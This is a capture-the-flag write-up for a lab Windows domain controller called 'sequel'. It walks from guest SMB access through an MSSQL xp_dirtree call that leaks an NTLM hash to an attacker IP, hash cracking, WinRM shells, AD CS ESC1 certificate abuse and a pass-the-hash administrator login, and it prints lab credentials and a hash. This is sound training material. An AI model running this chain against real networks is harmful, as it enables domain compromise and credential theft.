Difficulty: Medium

### Information Gathering

IP Address: 10.129.38.206

# User Flag
#### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.38.206
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

An entry is added to the `/etc/hosts` file.
```
10.129.38.206         sequel.htb dc.sequel.htb
```

The shares are accessible from the guest session.
```
netexec smb sequel.htb -u 'guest' -p ''
```

The share `Public` contains some interesting information.
```
smbclient //10.129.38.206/Public
```

```
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

		5184255 blocks of size 4096. 1466298 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (45.8 KiloBytes/sec) (average 45.8 KiloBytes/sec)
```

Credentials are hardcoded.
![](<Screenshot 2026-07-25 at 10.28.08.png>)

The credentials are now checked from `netexec`.
```
netexec mssql sequel.htb -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth
```

The credentials work successfully.
The connection to the SQL Database server is intiated.
```
impacket-mssqlclient PublicUser@sequel.htb
exec master.sys.xp_dirtree '\\10.10.14.104\share', 1, 1
```

Responder will be listening to the attacker machine.
```
sudo responder -I tun0 -v
```

A hash has been returned and it can be cracked using `hashcat`.
```
hashcat hash.txt rockyou.txt
```

A new pair of credentials has been obtained.
`sql_svc:REGGIE1234ronnie`

The credentials allow to connect via WinRM.
```
evil-winrm -i sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'
```

After examining the `C:\` directory, it is possible to find an unusual folder named `SQLServer`.

Credentials of the user `Ryan.Cooper` has been found from the `C:\SQLServer\Logs\ERRORLOG.bak` file.

`Ryan.Cooper:NuclearMosquito3`

These credentials allow remote access too.
```
evil-winrm -i sequel.htb -u 'ryan.cooper' -p 'NuclearMosquito3'
```

The user flag has been successfully obtained.
![](<Screenshot 2026-07-25 at 11.42.06.png>)

# Root Flag
#### Privilege Escalation

Since the user seems to have association with the certificate services, the vulnerable certificates will be checked.
```
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -vulnerable -stdout
```

The user is vulnerable to `ESC1`.

Exploitation steps are performed according to this website:
https://www.vaadata.com/en/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/#aioseo-esc1-identity-theft


The PFX file will be requested.
```
certipy-ad req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.38.206 -target dc.sequel.htb -ca 'sequel-DC-CA' -template UserAuthentication -upn 'administrator@sequel.htb'
```

Those commands follow, without entering a password.
```
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.pem
openssl x509 -in administrator.pem -text -noout
```

The hash is now being requested from the administrator session.
```
sudo ntpdate sequel.htb
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.38.206
```

The hash for `administrator` user has been obtained.
This user allow for remote access via WinRM.
```
evil-winrm -i sequel.htb -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

The root flag has been successfully obtained.
![](<Screenshot 2026-07-25 at 11.51.25.png>)